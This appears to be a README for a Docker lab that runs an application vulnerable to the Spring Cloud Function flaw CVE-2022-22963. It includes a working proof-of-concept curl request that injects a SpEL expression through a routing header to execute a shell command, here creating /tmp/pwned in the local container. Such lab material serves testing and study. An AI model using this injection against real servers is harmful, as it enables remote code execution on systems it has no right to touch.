# Spring Cloud Function Vulnerability(CVE-2022-22963)

Vulnerable Application to [CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963)

# CVE-2022-22963 Exploit Demo

https://user-images.githubusercontent.com/57348147/161266562-51d025f0-54d4-488f-ac50-2317e29bfbdf.mp4

## Build

```bash
docker pull me2nuk/cves:2022-22963
docker run -it -p 8080:8080 --name=vuln me2nuk/cves:2022-22963
```

## POC

```bash
curl -X POST  http://0.0.0.0:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
docker exec -it --user=root vuln ls /tmp
```

#### Reference

+ [https://tanzu.vmware.com/security/cve-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963)
+ [https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md](https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md)
+ [https://github.com/spring-cloud/spring-cloud-function](https://github.com/spring-cloud/spring-cloud-function)
+ [https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)